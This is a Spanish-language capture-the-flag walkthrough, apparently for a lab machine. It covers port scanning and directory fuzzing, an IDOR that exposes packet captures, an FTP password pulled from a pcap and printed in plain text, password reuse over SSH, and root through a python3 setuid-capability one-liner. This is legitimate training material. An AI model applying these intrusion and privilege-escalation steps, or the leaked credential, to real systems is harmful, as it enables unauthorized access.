tags: #capabilities #tshark
_____
## Reconocimiento

```bash
ping -c 1 10.10.10.245
```

![Pasted image 20251102043514](../../../Anexos/Pasted%20image%2020251102043514.png)

Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- -vvv -n -Pn --open -oN ports 172.17.0.2 --min-rate 5000
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![Pasted image 20251102043800.png](Pasted%20image%2020251102043800.png)

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV -p80 -n -Pn -vvv --min-rate 5000 -oN version 172.17.0.2
```

![Pasted image 20251102043746](../../../Anexos/Pasted%20image%2020251102043746.png)

Vamos a echar un ojo al servicio web, donde de primeras vemos un posible usuario: **Nathan**

![Pasted image 20251102043852.png](Pasted%20image%2020251102043852.png)

Antes de continuar voy a aplicar fuzzing para descubrir directorios y archivos ocultos:

```bash
gobuster dir -u http://10.10.10.245/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -t 100 -o dirs.txt
```

![Pasted image 20251102050021](../../../Anexos/Pasted%20image%2020251102050021.png)

Al acceder a capture, se nos crea una snapshot de seguridad con el siguiente formato: **NUMERO.pcap** siguiendo un orden numérico, empezando por el 0.
Si lo ejecutamos, vemos que en la URL se crea lo siguiente:

![Pasted image 20251102050141](../../../Anexos/Pasted%20image%2020251102050141.png)

No es difícil intentar probar si estamos ante un IDOR, lo cual así es y podemos comprobar que hay varios archivos ya creados, así que probamos número a número, empezando por el 0 para descargarlos todos y analizarlos en local. Para ello empezamos con el primero: **0.pcap** con el siguiente comando:

```bash
tshark -r 0.pcap
```

![Pasted image 20251102050526.png](Pasted%20image%2020251102050526.png)

Vemos mucho texto, pero si nos fijamos, hay varios paquetes que se transmiten por el protocolo FTP, lo que nos puede dar pistas sobre usuarios o contraseñas:

Vamos a usar el siguiente comando para filtrar solamente por las líneas que contengan la palabra FTP:

```bash
tshark -r 0.pcap | grep "FTP"
```

![Pasted image 20251102050737.png](Pasted%20image%2020251102050737.png)

```bash
nathan:Buck3tH4TF0RM3!
```

![Pasted image 20251102051117](../../../Anexos/Pasted%20image%2020251102051117.png)

Accedemos por FTP y nos descargamos todo con el comando:

```bash
mget *
```

Leemos el archivo user.txt para obtener su flag:

![Pasted image 20251102054643.png](Pasted%20image%2020251102054643.png)

Ahora probamos acceder por ssh con la contraseña del FTP para ver si hay reutilización de contraseñas, y efectivamente la hay:

```bash
ssh nathan@10.10.10.245
```

![Pasted image 20251102054940.png](Pasted%20image%2020251102054940.png)

Ahora vamos a comprobar las capabilities de los binarios para buscar un vector de ataque, y vemos que python3.8 tiene la capability de SETUID, lo cual significa que cualquiera que ejecute python3 va a hacerlo como el usuario root, así que manos a la obra:

![Pasted image 20251102054917.png](Pasted%20image%2020251102054917.png)

Lo que voy a hacer ahora es ejecutar un comando de python3 en modo interactivo con el parámetro -c y pedir que me cambie el id a 0, que es el de root.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

![Pasted image 20251102060157](../../../Anexos/Pasted%20image%2020251102060157.png)